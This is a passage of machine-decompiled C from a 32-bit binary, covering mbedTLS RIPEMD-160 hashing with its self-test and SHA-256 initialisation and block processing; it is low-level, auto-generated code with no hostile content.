    *(char *)(g7 + 4) = (char)*(int32_t *)(g3 + 12);
    *(char *)(g7 + 5) = (char)(*(int32_t *)(g3 + 12) / 256);
    *(char *)(g7 + 6) = (char)*(int16_t *)(g3 + 14);
    *(char *)(g7 + 7) = *(char *)(g3 + 15);
    *(char *)(g7 + 8) = (char)*(int32_t *)(g3 + 16);
    *(char *)(g7 + 9) = (char)(*(int32_t *)(g3 + 16) / 256);
    *(char *)(g7 + 10) = (char)*(int16_t *)(g3 + 18);
    *(char *)(g7 + 11) = *(char *)(g3 + 19);
    *(char *)(g7 + 12) = (char)*(int32_t *)(g3 + 20);
    *(char *)(g7 + 13) = (char)(*(int32_t *)(g3 + 20) / 256);
    *(char *)(g7 + 14) = (char)*(int16_t *)(g3 + 22);
    *(char *)(g7 + 15) = *(char *)(g3 + 23);
    *(char *)(g7 + 16) = (char)*(int32_t *)(g3 + 24);
    *(char *)(g7 + 17) = (char)(*(int32_t *)(g3 + 24) / 256);
    *(char *)(g7 + 18) = (char)*(int16_t *)(g3 + 26);
    char result = *(char *)(g3 + 27); // 0x8066de0
    *(char *)(g7 + 19) = result;
    g7 = v2;
    g5 = v1;
    return result;
}

// Address range: 0x8066e00 - 0x8066e7f
int32_t mbedtls_ripemd160(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = g3; // 0x8066e03
    int32_t v2;
    int32_t v3 = &v2; // 0x8066e07_0
    g3 = v3;
    mbedtls_ripemd160_init((char *)&v2);
    v2 = 0;
    g1 = a1;
    mbedtls_ripemd160_update((char *)g3, (char *)a1, a2);
    mbedtls_ripemd160_finish((int32_t *)g3, (char *)a3);
    g1 = v3;
    *(char *)v3 = 0;
    int32_t result = g1 + 1; // 0x8066e73
    g1 = result;
    // branch -> 0x8066e70
    int32_t v4;
    while (result != (int32_t)&v4) {
        // 0x8066e70
        *(char *)result = 0;
        result = g1 + 1;
        g1 = result;
        // continue -> 0x8066e70
    }
    // 0x8066e7a
    g3 = v1;
    int32_t v5;
    g2 = v5;
    return result;
}

// Address range: 0x8066e80 - 0x8066f6f
int32_t mbedtls_ripemd160_self_test(int32_t a1) {
    int32_t v1 = g5; // 0x8066e83
    int32_t v2 = g7; // 0x8066e84
    int32_t v3 = g3; // 0x8066e85
    g3 = 1;
    int32_t str2; // bp-48
    int32_t v4 = &str2; // 0x8066e8b_0
    str2 = 0;
    int32_t v5 = 1; // 0x8066f0b
    char * str3 = (char *)&g123;
    // branch -> 0x8066f04
    while (true) {
        int32_t v6 = v5; // 0x8066ec0
        if (a1 != 0) {
            // 0x8066f0b
            printf("  RIPEMD-160 test #%d: ", v5);
            v6 = g3;
            // branch -> 0x8066ec0
        }
        int32_t str = *(int32_t *)(4 * v6 + (int32_t)&g122); // 0x8066ec0
        g7 = str;
        mbedtls_ripemd160(g7, strlen((char *)str), v4, 0);
        int32_t v7 = (int32_t)str3;
        g5 = v7;
        uint32_t strncmp_rc = strncmp((char *)&str2, str3, 20);
        g237 = strncmp_rc % 2 == 0;
        if (strncmp_rc % 2 != 0) {
            // 0x8066f48
            g1 = 1;
            if (a1 == 0) {
                // 0x8066f3a
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return 1;
            }
            // 0x8066f54
            puts("failed");
            g1 = 1;
            // branch -> 0x8066f3a
            // 0x8066f3a
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return 1;
        }
        int32_t v8 = g3 + 1; // 0x8066ef8
        g3 = v8;
        int32_t v9;
        if (a1 == 0) {
            // 0x8066ef8
            if (v8 != 9) {
                v9 = 0;
              lab_0x8066f04:
                // 0x8066f04
                v5 = v8;
                a1 = v9;
                str3 = (char *)(v7 + 20);
                // branch -> 0x8066f04
                continue;
            }
        } else {
            // 0x8066f20
            puts("passed");
            int32_t v10 = g3; // 0x8066f33
            if (v10 != 9) {
                // 0x8066f20
                v9 = a1;
                v8 = v10;
                // branch -> 0x8066f04
                goto lab_0x8066f04;
            }
        }
        // 0x8066f38
        g1 = 0;
        // branch -> 0x8066f3a
        // 0x8066f3a
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return 0;
    }
}

// Address range: 0x8066f70 - 0x8066f8f
void mbedtls_sha256_free(char * a1) {
    int32_t v1 = (int32_t)a1;
    g1 = v1;
    if (a1 == NULL) {
        // 0x8066f8a
        return;
    }
    // 0x8066f7a
    g6 = v1 + 108;
    *(char *)v1 = 0;
    int32_t v2 = g1 + 1; // 0x8066f83
    g1 = v2;
    // branch -> 0x8066f80
    while (v2 != g6) {
        // 0x8066f80
        *(char *)v2 = 0;
        v2 = g1 + 1;
        g1 = v2;
        // continue -> 0x8066f80
    }
    // 0x8066f8a
    // branch -> 0x8066f8a
}

// Address range: 0x8066f90 - 0x8066fb6
void mbedtls_sha256_clone(char * a1, char * a2) {
    // 0x8066f90
    g1 = (int32_t)a1;
    memcpy(a1, a2, 27);
}

// Address range: 0x8066fb7 - 0x8066fbf
int32_t function_8066fb7(int32_t a1) {
    // 0x8066fb7
    return g7;
}

// Address range: 0x8066fc0 - 0x806705f
int32_t mbedtls_sha256_starts(int32_t * a1, int32_t a2) {
    int32_t result = (int32_t)a1;
    *a1 = 0;
    *(int32_t *)(result + 4) = 0;
    int32_t * v1 = (int32_t *)(result + 8); // 0x8067018_0
    if (a2 == 0) {
        // 0x8067018
        *v1 = 0x6a09e667;
        *(int32_t *)(result + 12) = -0x4498517b;
        *(int32_t *)(result + 16) = 0x3c6ef372;
        *(int32_t *)(result + 20) = -0x5ab00ac6;
        *(int32_t *)(result + 24) = 0x510e527f;
        *(int32_t *)(result + 28) = -0x64fa9774;
        *(int32_t *)(result + 32) = 0x1f83d9ab;
        *(int32_t *)(result + 36) = 0x5be0cd19;
        *(int32_t *)(result + 104) = a2;
        return result;
    }
    // 0x8066fda
    *v1 = -0x3efa6128;
    *(int32_t *)(result + 12) = 0x367cd507;
    *(int32_t *)(result + 16) = 0x3070dd17;
    *(int32_t *)(result + 20) = -0x8f1a6c7;
    *(int32_t *)(result + 24) = -0x3ff4cf;
    *(int32_t *)(result + 28) = 0x68581511;
    *(int32_t *)(result + 32) = 0x64f98fa7;
    *(int32_t *)(result + 36) = -0x4105b05c;
    *(int32_t *)(result + 104) = a2;
    return result;
}

// Address range: 0x8067060 - 0x8067e9f
// Used cryptographic patterns:
//  - SHA256_Hash_constant_words_K__0x428a2f98_ (32-bit, little endian)
int32_t mbedtls_sha256_process(int32_t a1, int32_t a2) {
    int32_t v1;
    int32_t v2 = &v1; // 0x8067060_0
    int32_t v3 = g3; // 0x8067067
    *(int32_t *)(v2 - 44) = *(int32_t *)(a1 + 8);
    int32_t v4 = 1; // 0x8067080382
    int32_t v5; // 0x80670b5
    int32_t v6; // 0x80675ef
    int32_t v7; // 0x8067dfc
    int32_t v8; // 0x8067e05
    int32_t v9; // 0x8067e88
    int32_t v10; // 0x8067e88373
    uint32_t v11; // 0x8067159
    uint32_t v12; // 0x80671b7
    int32_t v13; // 0x80671eb
    uint32_t v14; // 0x806722c
    uint32_t v15; // 0x8067232
    int32_t v16; // 0x806729b
    uint32_t v17; // 0x80672ea
    uint32_t v18; // 0x80672f0
    int32_t v19; // 0x8067359
    uint32_t v20; // 0x8067374
    uint32_t v21; // 0x80673b6
    int32_t v22; // 0x8067403
    uint32_t v23; // 0x8067409
    uint32_t v24; // 0x806746a
    int32_t v25; // 0x80674ac
    uint32_t v26; // 0x80674ef
    uint32_t v27; // 0x8067507
    int32_t v28; // 0x8067567
    uint32_t v29; // 0x80675bc
    uint32_t v30; // 0x80675c2
    int32_t v31; // 0x8067655
    uint32_t v32; // 0x8067751
    uint32_t v33; // 0x8067876
    uint32_t v34; // 0x806787c
    uint32_t v35; // 0x806796e
    uint32_t v36; // 0x8067974
    int32_t v37; // 0x80679c6
    int32_t v38; // 0x8067a0e
    uint32_t v39; // 0x8067a58
    uint32_t v40; // 0x8067a6a
    uint32_t v41; // 0x8067b1a
    uint32_t v42; // 0x8067b5d
    int32_t v43; // 0x8067ba6
    uint32_t v44; // 0x8067c3c
    uint32_t v45; // 0x8067c42
    uint32_t v46; // 0x8067d2c
    uint32_t v47; // 0x8067d32
    int32_t v48; // 0x8067d87
    int32_t v49; // 0x8067dd8
    int32_t v50; // 0x806708a_0
    int32_t * v51; // 0x80676b8_0
    int32_t * v52; // 0x8067791_0
    int32_t * v53; // 0x80679a8_0
    int32_t * v54; // 0x8067a95_0
    int32_t * v55; // 0x8067b79_0
    int32_t * v56; // 0x8067c73_0
    int32_t * v57; // 0x8067e84_0
    int32_t * v58; // 0x0369
    int32_t v59; // eax
    int32_t v60; // ecx
    int32_t v61; // edx
    int32_t v62;
    int32_t v63;
    int32_t v64;
    int32_t v65;
    int32_t v66;
    int32_t v67;
    int32_t v68;
    int32_t v69;
    int32_t v70;
    uint32_t v71; // 0x80671f7
    uint32_t v72; // 0x8067b58
    uint32_t v73; // 0x8067d4d
    int32_t v74; // 0x80676c1
    int32_t v75; // 0x8067090
    int32_t v76; // 0x8067108
    int32_t v77; // 0x80673bc
    int32_t v78; // 0x80676fb
    int32_t v79; // 0x8067791
    int32_t v80; // 0x8067897
    int32_t v81; // 0x806797a
    int32_t v82; // 0x8067a70
    int32_t v83; // 0x8067b6c
    int32_t v84; // 0x8067c5d
    int32_t v85; // 0x8067d20
    int32_t v86; // 0x8067d92
    int32_t v87; // 0x8067150
    int32_t v88; // 0x8067602
    int32_t v89; // 0x806765e
    int32_t v90; // 0x80676f1
    uint32_t v91; // 0x80676fe
    int32_t v92; // 0x8067745
    uint32_t v93; // 0x8067794
    uint32_t v94; // 0x80677cb
    int32_t v95; // 0x8067825
    int32_t v96; // 0x80678c9
    uint32_t v97; // 0x80678d5
    int32_t v98; // 0x8067916
    int32_t v99; // 0x8067ab4
    uint32_t v100; // 0x8067ac1
    int32_t v101; // 0x8067b08
    int32_t v102; // 0x8067beb
    int32_t v103; // 0x8067c8c
    int32_t v104; // 0x8067cde
    int32_t v105; // 0x8067e1e
    uint32_t v106; // 0x8067e1e339
    uint32_t v107; // 0x8067e41351
    uint32_t v108; // 0x8067e41352
    int32_t v109; // 0x8067e47347
    int32_t v110; // 0x8067e47348
    int32_t v111; // 0x8067e50349
    int32_t v112; // 0x8067e50350
    int32_t v113; // 0x8067e59340
    int32_t v114; // 0x8067e59341
    int32_t v115; // 0x8067e5f342
    int32_t v116; // 0x8067e5f343
    int32_t v117; // 0x806750d
    unsigned char v118; // 0x8067090
    int32_t v119; // 0x80670fb
    uint32_t v120; // 0x80676b8
    uint32_t v121; // 0x80676bb
    uint32_t v122; // 0x80676be
    uint32_t v123; // 0x80676cb
    uint32_t v124; // 0x8067791
    uint32_t v125; // 0x8067797
    uint32_t v126; // 0x80677a0
    uint32_t v127; // 0x80677ae
    uint32_t v128; // 0x8067897
    uint32_t v129; // 0x80679a8
    uint32_t v130; // 0x80679ad
    uint32_t v131; // 0x80679b8
    int32_t v132; // 0x8067a70
    uint32_t v133; // 0x8067a95
    uint32_t v134; // 0x8067a9b
    uint32_t v135; // 0x8067aa6
    int32_t v136; // 0x8067b6c
    uint32_t v137; // 0x8067b79
    uint32_t v138; // 0x8067b84
    uint32_t v139; // 0x8067b95
    int32_t v140; // 0x8067c5d
    uint32_t v141; // 0x8067c73
    uint32_t v142; // 0x8067c79
    uint32_t v143; // 0x8067c84
    int32_t v144; // 0x8067d20
    uint32_t v145; // 0x8067d44
    int32_t v146; // 0x8067e6d
    int32_t v147; // 0x8067108
    int32_t v148; // 0x80676ce
    int32_t v149; // 0x80677a3
    int32_t v150; // 0x806789a
    int32_t v151; // 0x806797a
    int32_t v152; // 0x8067a73
    int32_t v153; // 0x8067b71
    int32_t v154; // 0x8067c60
    int32_t v155; // 0x8067e80
    int32_t v156; // 0x8067090
    int32_t v157; // 0x8067250
    int32_t v158; // 0x806750d
    unsigned char v159; // 0x8067094
    unsigned char v160; // 0x80670a1
    unsigned char v161; // 0x80670a8
    int32_t v162; // 0x80670fb
    int32_t v163; // 0x80676f4
    int32_t v164; // 0x80677d4
    int32_t v165; // 0x80678c2
    int32_t v166; // 0x806795e
    int32_t v167; // 0x8067ab7
    int32_t v168; // 0x8067ba8
    int32_t v169; // 0x806719a
    int32_t v170; // 0x80671a4
    int32_t v171; // 0x8067250
    int32_t v172; // 0x806725a
    int32_t v173; // 0x806730e
    int32_t v174; // 0x8067318
    int32_t v175; // 0x80673bc
    int32_t v176; // 0x80673c0
    int32_t v177; // 0x806745f
    int32_t v178; // 0x8067463
    int32_t v179; // 0x806750d
    int32_t v180; // 0x8067511
    int32_t v181; // 0x8067543
    int32_t v182; // 0x8067547
    int32_t v183; // 0x8067c98
    int32_t v184; // 0x8067d92
    if (v4 != 8) {
        int32_t v185 = 4 * v4; // 0x8067078
        int32_t v186 = *(int32_t *)(a1 + 8 + v185); // 0x8067078
        *(int32_t *)(v2 - 44 + v185) = v186;
        int32_t v187 = v4 + 1; // 0x8067080
        while (v187 != 8) {
            // 0x8067078
            v185 = 4 * v187;
            v186 = *(int32_t *)(a1 + 8 + v185);
            *(int32_t *)(v2 - 44 + v185) = v186;
            v187++;
            // continue -> 0x8067078
        }
        // 0x8067088
        v60 = 0;
        v50 = &v65;
        v59 = v50;
        int32_t v188 = v50; // 0x80670b2
        int32_t v189 = 0; // 0x80670b2
        // branch -> 0x8067090
        while (true) {
            // 0x8067090
            v75 = a2;
            v156 = 4 * v189;
            v118 = *(char *)(v156 + v75);
            v159 = *(char *)(v75 + 1 + v156);
            v160 = *(char *)(v75 + 3 + v156);
            v161 = *(char *)(v75 + 2 + v156);
            *(int32_t *)(v156 + v188) = 256 * (int32_t)v161 | 0x10000 * (int32_t)v159 | 0x1000000 * (int32_t)v118 | (int32_t)v160;
            v5 = v60 + 1;
            v60 = v5;
            if (v5 == 16) {
                // 0x80670bd
                v61 = 0;
                v71 = v70;
                v108 = v66;
                v112 = v63;
                v110 = v64;
                v116 = v68;
                v114 = v69;
                v119 = 0;
                v162 = *(int32_t *)(v119 + (int32_t)&SHA256_Hash_constant_words_K__0x428a2f98__at_807c200);
                v76 = v59;
                v147 = *(int32_t *)(v76 + v119);
                v87 = ((0x4000000 * v108 | v108 / 64) ^ (0x200000 * v108 | v108 / 2048) ^ (128 * v108 | v108 / 0x2000000)) + v62 + ((v110 ^ v112) & v108 ^ v112) + v162 + v147;
                v11 = v87 + v67;
                v169 = *(int32_t *)(v119 + 4 + v76);
                v170 = *(int32_t *)(v119 + (int32_t)&g125);
                v12 = v87 + ((v114 | v71) & v116 | v114 & v71) + ((0x80000 * v71 | v71 / 0x2000) ^ (0x40000000 * v71 | v71 / 4) ^ (1024 * v71 | v71 / 0x400000));
                v13 = v170 + v169 + v112 + (v11 & (v110 ^ v108) ^ v110) + ((0x4000000 * v11 | v11 / 64) ^ (0x200000 * v11 | v11 / 2048) ^ (128 * v11 | v11 / 0x2000000));
                v14 = v13 + v116;
                v15 = ((0x80000 * v12 | v12 / 0x2000) ^ (0x40000000 * v12 | v12 / 4) ^ (1024 * v12 | v12 / 0x400000)) + ((v12 | v71) & v114 | v12 & v71) + v13;
                v157 = 4 * v61;
                v171 = *(int32_t *)(v76 + 8 + v157);
                v172 = *(int32_t *)(v157 + (int32_t)&g126);
                v16 = v172 + v171 + v110 + (v14 & (v11 ^ v108) ^ v108) + ((0x4000000 * v14 | v14 / 64) ^ (0x200000 * v14 | v14 / 2048) ^ (128 * v14 | v14 / 0x2000000));
                v17 = v16 + v114;
                v18 = ((0x40000000 * v15 | v15 / 4) ^ (0x80000 * v15 | v15 / 0x2000) ^ (1024 * v15 | v15 / 0x400000)) + ((v15 | v12) & v71 | v15 & v12) + v16;
                v173 = *(int32_t *)(v76 + 12 + v157);
                v174 = *(int32_t *)(v157 + (int32_t)&g127);
                v19 = v174 + v173 + v108 + (v17 & (v14 ^ v11) ^ v11) + ((0x4000000 * v17 | v17 / 64) ^ (0x200000 * v17 | v17 / 2048) ^ (128 * v17 | v17 / 0x2000000));
                v20 = v19 + v70;
                v21 = ((0x40000000 * v18 | v18 / 4) ^ (0x80000 * v18 | v18 / 0x2000) ^ (1024 * v18 | v18 / 0x400000)) + ((v18 | v15) & v12 | v18 & v15) + v19;
                v77 = v59;
                v175 = *(int32_t *)(v77 + 16 + v157);
                v176 = *(int32_t *)(v157 + (int32_t)&g128);
                v22 = v176 + v175 + v11 + (v20 & (v17 ^ v14) ^ v14) + ((0x4000000 * v20 | v20 / 64) ^ (0x200000 * v20 | v20 / 2048) ^ (128 * v20 | v20 / 0x2000000));
                v23 = v22 + v12;
                v177 = *(int32_t *)(v77 + 20 + v157);
                v178 = *(int32_t *)(v157 + (int32_t)&g129);
                v24 = v22 + ((0x40000000 * v21 | v21 / 4) ^ (0x80000 * v21 | v21 / 0x2000) ^ (1024 * v21 | v21 / 0x400000)) + ((v21 | v18) & v15 | v21 & v18);
                v25 = v178 + v177 + v14 + (v23 & (v20 ^ v17) ^ v17) + ((0x4000000 * v23 | v23 / 64) ^ (0x200000 * v23 | v23 / 2048) ^ (128 * v23 | v23 / 0x2000000));
                v26 = v25 + v15;
                v27 = ((0x80000 * v24 | v24 / 0x2000) ^ (0x40000000 * v24 | v24 / 4) ^ (1024 * v24 | v24 / 0x400000)) + ((v24 | v21) & v18 | v24 & v21) + v25;
                v117 = v61;
                v158 = 4 * v117;
                v179 = *(int32_t *)(v77 + 24 + v158);
                v180 = *(int32_t *)(v158 + (int32_t)&g130);
                v181 = *(int32_t *)(v77 + 28 + v158);
                v182 = *(int32_t *)(v158 + (int32_t)&g131);
                v28 = v180 + v179 + v17 + (v26 & (v23 ^ v20) ^ v20) + ((0x4000000 * v26 | v26 / 64) ^ (0x200000 * v26 | v26 / 2048) ^ (128 * v26 | v26 / 0x2000000));
                v29 = ((0x40000000 * v27 | v27 / 4) ^ (0x80000 * v27 | v27 / 0x2000) ^ (1024 * v27 | v27 / 0x400000)) + ((v27 | v24) & v21 | v27 & v24) + v28;
                v30 = v28 + v18;
                v6 = v117 + 8;
                v61 = v6;
                v88 = v182 + v181 + v20 + (v30 & (v26 ^ v23) ^ v23) + ((0x4000000 * v30 | v30 / 64) ^ (0x200000 * v30 | v30 / 2048) ^ (128 * v30 | v30 / 0x2000000));
                v31 = v88 + v21;
                v89 = v88 + ((0x40000000 * v29 | v29 / 4) ^ (0x80000 * v29 | v29 / 0x2000) ^ (1024 * v29 | v29 / 0x400000)) + ((v29 | v27) & v24 | v29 & v27);
                // branch -> 0x80670fb
                while (v6 != 16) {
                    // 0x80670fb
                    v71 = v89;
                    v108 = v31;
                    v112 = v26;
                    v110 = v30;
                    v116 = v27;
                    v114 = v29;
                    v119 = 4 * v6;
                    v162 = *(int32_t *)(v119 + (int32_t)&SHA256_Hash_constant_words_K__0x428a2f98__at_807c200);
                    v76 = v59;
                    v147 = *(int32_t *)(v76 + v119);
                    v87 = ((0x4000000 * v108 | v108 / 64) ^ (0x200000 * v108 | v108 / 2048) ^ (128 * v108 | v108 / 0x2000000)) + v23 + ((v110 ^ v112) & v108 ^ v112) + v162 + v147;
                    v11 = v87 + v24;
                    v169 = *(int32_t *)(v119 + 4 + v76);
                    v170 = *(int32_t *)(v119 + (int32_t)&g125);
                    v12 = v87 + ((v114 | v71) & v116 | v114 & v71) + ((0x80000 * v71 | v71 / 0x2000) ^ (0x40000000 * v71 | v71 / 4) ^ (1024 * v71 | v71 / 0x400000));
                    v13 = v170 + v169 + v112 + (v11 & (v110 ^ v108) ^ v110) + ((0x4000000 * v11 | v11 / 64) ^ (0x200000 * v11 | v11 / 2048) ^ (128 * v11 | v11 / 0x2000000));
                    v14 = v13 + v116;
                    v15 = ((0x80000 * v12 | v12 / 0x2000) ^ (0x40000000 * v12 | v12 / 4) ^ (1024 * v12 | v12 / 0x400000)) + ((v12 | v71) & v114 | v12 & v71) + v13;
                    v157 = 4 * v61;
                    v171 = *(int32_t *)(v76 + 8 + v157);
                    v172 = *(int32_t *)(v157 + (int32_t)&g126);
                    v16 = v172 + v171 + v110 + (v14 & (v11 ^ v108) ^ v108) + ((0x4000000 * v14 | v14 / 64) ^ (0x200000 * v14 | v14 / 2048) ^ (128 * v14 | v14 / 0x2000000));
                    v17 = v16 + v114;
                    v18 = ((0x40000000 * v15 | v15 / 4) ^ (0x80000 * v15 | v15 / 0x2000) ^ (1024 * v15 | v15 / 0x400000)) + ((v15 | v12) & v71 | v15 & v12) + v16;
                    v173 = *(int32_t *)(v76 + 12 + v157);
                    v174 = *(int32_t *)(v157 + (int32_t)&g127);
                    v19 = v174 + v173 + v108 + (v17 & (v14 ^ v11) ^ v11) + ((0x4000000 * v17 | v17 / 64) ^ (0x200000 * v17 | v17 / 2048) ^ (128 * v17 | v17 / 0x2000000));
                    v20 = v19 + v89;
                    v21 = ((0x40000000 * v18 | v18 / 4) ^ (0x80000 * v18 | v18 / 0x2000) ^ (1024 * v18 | v18 / 0x400000)) + ((v18 | v15) & v12 | v18 & v15) + v19;
                    v77 = v59;
                    v175 = *(int32_t *)(v77 + 16 + v157);
                    v176 = *(int32_t *)(v157 + (int32_t)&g128);
                    v22 = v176 + v175 + v11 + (v20 & (v17 ^ v14) ^ v14) + ((0x4000000 * v20 | v20 / 64) ^ (0x200000 * v20 | v20 / 2048) ^ (128 * v20 | v20 / 0x2000000));
                    v23 = v22 + v12;
                    v177 = *(int32_t *)(v77 + 20 + v157);
                    v178 = *(int32_t *)(v157 + (int32_t)&g129);
                    v24 = v22 + ((0x40000000 * v21 | v21 / 4) ^ (0x80000 * v21 | v21 / 0x2000) ^ (1024 * v21 | v21 / 0x400000)) + ((v21 | v18) & v15 | v21 & v18);
                    v25 = v178 + v177 + v14 + (v23 & (v20 ^ v17) ^ v17) + ((0x4000000 * v23 | v23 / 64) ^ (0x200000 * v23 | v23 / 2048) ^ (128 * v23 | v23 / 0x2000000));
                    v26 = v25 + v15;
                    v27 = ((0x80000 * v24 | v24 / 0x2000) ^ (0x40000000 * v24 | v24 / 4) ^ (1024 * v24 | v24 / 0x400000)) + ((v24 | v21) & v18 | v24 & v21) + v25;
                    v117 = v61;
                    v158 = 4 * v117;
                    v179 = *(int32_t *)(v77 + 24 + v158);
                    v180 = *(int32_t *)(v158 + (int32_t)&g130);
                    v181 = *(int32_t *)(v77 + 28 + v158);
                    v182 = *(int32_t *)(v158 + (int32_t)&g131);
                    v28 = v180 + v179 + v17 + (v26 & (v23 ^ v20) ^ v20) + ((0x4000000 * v26 | v26 / 64) ^ (0x200000 * v26 | v26 / 2048) ^ (128 * v26 | v26 / 0x2000000));
                    v29 = ((0x40000000 * v27 | v27 / 4) ^ (0x80000 * v27 | v27 / 0x2000) ^ (1024 * v27 | v27 / 0x400000)) + ((v27 | v24) & v21 | v27 & v24) + v28;
                    v30 = v28 + v18;
                    v6 = v117 + 8;
                    v61 = v6;
                    v88 = v182 + v181 + v20 + (v30 & (v26 ^ v23) ^ v23) + ((0x4000000 * v30 | v30 / 64) ^ (0x200000 * v30 | v30 / 2048) ^ (128 * v30 | v30 / 0x2000000));
                    v31 = v88 + v21;
                    v89 = v88 + ((0x40000000 * v29 | v29 / 4) ^ (0x80000 * v29 | v29 / 0x2000) ^ (1024 * v29 | v29 / 0x400000)) + ((v29 | v27) & v24 | v29 & v27);
                    // continue -> 0x80670fb
                }
                // 0x806766d
                v78 = v59;
                v107 = v31;
                v111 = v26;
                v109 = v30;
                v115 = v27;
                v113 = v29;
                v106 = v89;
                v51 = (int32_t *)(v78 + 56);
                v120 = *v51;
                v121 = *v51;
                v122 = *(int32_t *)(v78 + 4);
                v74 = *(int32_t *)v78;
                v123 = *v51;
                v148 = *(int32_t *)(v78 + 36);
                v90 = v148 + v74 + (v123 / 1024 ^ (0x8000 * v121 | v121 / 0x20000) ^ (0x2000 * v120 | v120 / 0x80000)) + ((0x2000000 * v122 | v122 / 128) ^ v122 / 8 ^ (0x4000 * v122 | v122 / 0x40000));
                v163 = *(int32_t *)(64 + (int32_t)&SHA256_Hash_constant_words_K__0x428a2f98__at_807c200);
                *(int32_t *)(v78 + 64) = v90;
                v91 = v90;
                v92 = ((0x4000000 * v107 | v107 / 64) ^ (0x200000 * v107 | v107 / 2048) ^ (128 * v107 | v107 / 0x2000000)) + v23 + ((v109 ^ v111) & v107 ^ v111) + v163 + v91;
                v32 = v92 + v24;
                v79 = v59;
                v52 = (int32_t *)(v79 + 60);
                v124 = *v52;
                v93 = v92 + ((0x40000000 * v106 | v106 / 4) ^ (0x80000 * v106 | v106 / 0x2000) ^ (1024 * v106 | v106 / 0x400000)) + ((v106 | v113) & v115 | v106 & v113);
                v125 = *v52;
                v126 = *(int32_t *)(v79 + 8);
                v149 = *(int32_t *)(v79 + 40);
                v127 = *v52;
                v94 = (v127 / 1024 ^ (0x2000 * v125 | v125 / 0x80000) ^ (0x8000 * v124 | v124 / 0x20000)) + v149 + v122 + ((0x2000000 * v126 | v126 / 128) ^ v126 / 8 ^ (0x4000 * v126 | v126 / 0x40000));
                v164 = *(int32_t *)(4 * v61 + (int32_t)&g125);
                *(int32_t *)(v79 + 68) = v94;
                v95 = (v32 & (v109 ^ v107) ^ v109) + v111 + v164 + ((0x4000000 * v32 | v32 / 64) ^ (0x200000 * v32 | v32 / 2048) ^ (128 * v32 | v32 / 0x2000000)) + v94;
                v33 = v95 + v115;
                v34 = ((0x40000000 * v93 | v93 / 4) ^ (0x80000 * v93 | v93 / 0x2000) ^ (1024 * v93 | v93 / 0x400000)) + ((v93 | v106) & v113 | v93 & v106) + v95;
                v80 = v59;
                v128 = *(int32_t *)(v80 + 12);
                v150 = *(int32_t *)(v80 + 44);
                v165 = *(int32_t *)(4 * v61 + (int32_t)&g126);
                v96 = ((0x2000000 * v128 | v128 / 128) ^ v128 / 8 ^ (0x4000 * v128 | v128 / 0x40000)) + v126 + ((0x2000 * v91 | v91 / 0x80000) ^ v91 / 1024 ^ (0x8000 * v91 | v91 / 0x20000)) + v150;
                *(int32_t *)(v80 + 72) = v96;
                v97 = v96;
                v98 = v165 + v109 + v97 + (v33 & (v32 ^ v107) ^ v107) + ((0x4000000 * v33 | v33 / 64) ^ (0x200000 * v33 | v33 / 2048) ^ (128 * v33 | v33 / 0x2000000));
                v166 = *(int32_t *)(4 * v61 + (int32_t)&g127);
                v35 = v98 + v113;
                v36 = ((0x40000000 * v34 | v34 / 4) ^ (0x80000 * v34 | v34 / 0x2000) ^ (1024 * v34 | v34 / 0x400000)) + ((v34 | v93) & v106 | v34 & v93) + v98;
                v81 = v59;
                v151 = *(int32_t *)(v81 + 48);
                v53 = (int32_t *)(v81 + 16);
                v129 = *v53;
                v130 = *v53;
                v131 = *v53;
                v37 = ((0x2000000 * v130 | v130 / 128) ^ (0x4000 * v129 | v129 / 0x40000) ^ v131 / 8) + v151 + v128 + ((0x2000 * v94 | v94 / 0x80000) ^ v94 / 1024 ^ (0x8000 * v94 | v94 / 0x20000));
                *(int32_t *)(v81 + 76) = v37;
                v38 = v166 + v107 + (v35 & (v33 ^ v32) ^ v32) + ((0x4000000 * v35 | v35 / 64) ^ (0x200000 * v35 | v35 / 2048) ^ (128 * v35 | v35 / 0x2000000)) + v37;
                v39 = v38 + v106;
                v40 = ((0x40000000 * v36 | v36 / 4) ^ (0x80000 * v36 | v36 / 0x2000) ^ (1024 * v36 | v36 / 0x400000)) + ((v36 | v34) & v93 | v36 & v34) + v38;
                v82 = v59;
                v132 = *(int32_t *)(v82 + 16);
                v152 = *(int32_t *)(v82 + 52);
                v54 = (int32_t *)(v82 + 20);
                v133 = *v54;
                v134 = *v54;
                v135 = *v54;
                v99 = ((0x2000000 * v134 | v134 / 128) ^ (0x4000 * v133 | v133 / 0x40000) ^ v135 / 8) + v152 + v132 + ((0x2000 * v97 | v97 / 0x80000) ^ v97 / 1024 ^ (0x8000 * v97 | v97 / 0x20000));
                v167 = *(int32_t *)(4 * v61 + (int32_t)&g128);
                *(int32_t *)(v82 + 80) = v99;
                v100 = v99;
                v101 = v167 + v32 + v100 + (v39 & (v35 ^ v33) ^ v33) + ((0x4000000 * v39 | v39 / 64) ^ (0x200000 * v39 | v39 / 2048) ^ (128 * v39 | v39 / 0x2000000));
                v41 = v101 + v93;
                v72 = v37;
                v42 = ((0x40000000 * v40 | v40 / 4) ^ (0x80000 * v40 | v40 / 0x2000) ^ (1024 * v40 | v40 / 0x400000)) + ((v40 | v36) & v34 | v40 & v36) + v101;
                v83 = v59;
                v136 = *(int32_t *)(v83 + 20);
                v153 = *(int32_t *)(v83 + 56);
                v55 = (int32_t *)(v83 + 24);
                v137 = *v55;
                v138 = *v55;
                v139 = *v55;
                v43 = ((0x2000000 * v138 | v138 / 128) ^ (0x4000 * v137 | v137 / 0x40000) ^ v139 / 8) + ((0x2000 * v72 | v72 / 0x80000) ^ (0x8000 * v72 | v72 / 0x20000) ^ v72 / 1024) + v153 + v136;
                v168 = *(int32_t *)(4 * v61 + (int32_t)&g129);
                *(int32_t *)(v83 + 84) = v43;
                v102 = (v41 & (v39 ^ v35) ^ v35) + v33 + v168 + ((0x4000000 * v41 | v41 / 64) ^ (0x200000 * v41 | v41 / 2048) ^ (128 * v41 | v41 / 0x2000000)) + v43;
                v44 = ((0x40000000 * v42 | v42 / 4) ^ (0x80000 * v42 | v42 / 0x2000) ^ (1024 * v42 | v42 / 0x400000)) + ((v42 | v40) & v36 | v42 & v40) + v102;
                v45 = v102 + v34;
                v84 = v59;
                v140 = *(int32_t *)(v84 + 24);
                v154 = *(int32_t *)(v84 + 60);
                v56 = (int32_t *)(v84 + 28);
                v141 = *v56;
                v142 = *v56;
                v143 = *v56;
